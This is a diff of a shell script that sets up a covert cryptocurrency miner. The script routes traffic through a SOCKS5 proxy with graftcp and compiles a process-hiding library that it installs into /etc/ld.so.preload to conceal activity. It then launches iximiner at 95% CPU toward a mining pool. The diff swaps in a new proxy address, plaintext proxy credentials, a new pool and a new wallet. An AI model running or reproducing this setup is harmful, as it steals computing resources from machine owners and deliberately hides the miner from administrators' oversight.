@@ -23,9 +23,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 45.55.165.161:443
-socks5_username = majapahlevi
-socks5_password = majapahlevi
+socks5 = 157.245.142.37:443
+socks5_username = kalaumalingomongdonk
+socks5_password = kalaumalingomongdonk
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./iximiner --mode miner --pool http://mineixi.com --wallet 4sZ9fdGKwRkbbPKJ28ZLxpRcDmLcysweypjUxw5rGbLjzAT7fLjNPFHivsVGmCV3w --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 95 --gpu-intensity 0
+./graftcp/graftcp & clear & ./iximiner --mode miner --pool https://ixi.hash.express --wallet 3hy3CxLLChETAcx8Z6vSLH4q5QKPfitADPnksvmMTMV8DXmPK1sPD33KfWWuXmFAR --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 95 --gpu-intensity 0
